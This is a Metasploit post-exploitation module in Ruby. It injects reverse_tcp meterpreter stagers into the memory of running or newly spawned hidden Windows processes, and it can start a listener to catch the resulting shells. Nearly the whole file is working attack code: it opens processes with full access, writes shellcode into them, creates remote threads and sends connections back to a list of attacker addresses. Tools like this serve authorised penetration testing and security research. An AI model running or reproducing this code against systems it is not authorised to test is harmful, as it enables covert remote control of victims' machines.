##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post


  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Inject in Memory Multiple Payloads',
      'Description'   => %q{ This module will inject in to several processes a given
        payload and connecting to a given list of IP Addresses.
        The module works with a given lists of IP Addresses and
        process PIDs if no PID is given it will start a the given
        process in the advanced options and inject the selected
        payload in to the memory of the created module.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
                            'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>' # added multiple payload support
                         ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter']
    ))

    register_options(
      [
        OptString.new('PAYLOAD', [false, 'Payload to inject in to process memory', "windows/meterpreter/reverse_tcp"]),
        OptInt.new('LPORT',      [false, 'Port number for the payload LPORT variable.', 4444]),
        OptString.new('IPLIST',  [true, 'List of semicolom separated IP list.', Rex::Socket.source_address("1.2.3.4")]),
        OptString.new('PIDLIST', [false, 'List of semicolom separated PID list.', '']),
        OptBool.new('HANDLER',   [false, 'Start new multi/handler job on local box.', false]),
        OptInt.new('AMOUNT',     [false, 'Select the amount of shells you want to spawn.', 1])
      ], self.class)

    register_advanced_options(
      [
        OptString.new('PROCESSNAME', [false, 'Description', 'notepad.exe'])
      ],self.class)
  end

  # Run Method for when run command is issued
  def run
    unless client.platform =~ /win/
      print_error("This module requires native Windows meterpreter functions not compatible with the selected session")
      return
    end
    # Set variables
    multi_ip = nil
    multi_pid = nil

    print_status("Running module against #{sysinfo['Computer']}")

    if datastore['HANDLER']
      create_multi_handler(datastore['PAYLOAD'],datastore['LPORT'])
    end

    multi_ip = datastore['IPLIST'].split(";")
    multi_pid = datastore['PIDLIST'].split(";")

    datastore['AMOUNT'].times do # iterate through number of shells

        multi_ip.zip(multi_pid).each do |a|
            # Check if we have an IP for the session
            if a[1]
                payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
                inject(a[1],payload)
                select(nil, nil, nil, 5)
            else
                # if no PID we create a process to host the Meterpreter session
                payload = create_payload(datastore['PAYLOAD'],a[0],datastore['LPORT'])
                pid_num = start_proc(datastore['PROCESSNAME'])
                inject(pid_num,payload)
                select(nil, nil, nil, 5)
            end

        end
    end
  end

  # Function for injecting payload in to a given PID
  #-------------------------------------------------------------------------------
  def inject(target_pid, payload_to_inject)
    print_status("Injecting meterpreter into process ID #{target_pid}")
    begin
      host_process = session.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
      raw = payload_to_inject.generate
      mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

      print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
      print_status("Writing the stager into memory...")
      host_process.memory.write(mem, raw)
      host_process.thread.create(mem, 0)
      print_good("Successfully injected Meterpreter in to process: #{target_pid}")
    rescue::Exception => e
      print_error("Failed to Inject Payload to #{target_pid}!")
      print_error(e.message)
    end
  end

  # Function for Creation of Connection Handler
  #-------------------------------------------------------------------------------
  def create_multi_handler(payload_to_inject,rport,rhost = '0.0.0.0')
    print_status("Starting connection handler at port #{rport} for #{payload_to_inject}")
    mul = client.framework.exploits.create("multi/handler")
    mul.datastore['WORKSPACE'] = session.workspace
    mul.datastore['PAYLOAD']   = payload_to_inject
    mul.datastore['LHOST']     = rhost
    mul.datastore['LPORT']     = rport
    mul.datastore['EXITFUNC']  = 'process'
    mul.datastore['ExitOnSession'] = false

    mul.exploit_simple(
      'Payload'        => mul.datastore['PAYLOAD'],
      'RunAsJob'       => true
    )
    print_good("Multi/Handler started!")
  end

  # Function for Creating the Payload
  #-------------------------------------------------------------------------------
  def create_payload(payload_type,lhost,lport)
    print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
    payload = payload_type
    pay = client.framework.payloads.create(payload)
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    return pay
  end

  # Function starting notepad.exe process
  #-------------------------------------------------------------------------------
  def start_proc(proc_name)
    print_good("Starting Notepad.exe to house Meterpreter Session.")
    proc = client.sys.process.execute(proc_name, nil, {'Hidden' => true })
    print_good("Process created with pid #{proc.pid}")
    return proc.pid
  end
end
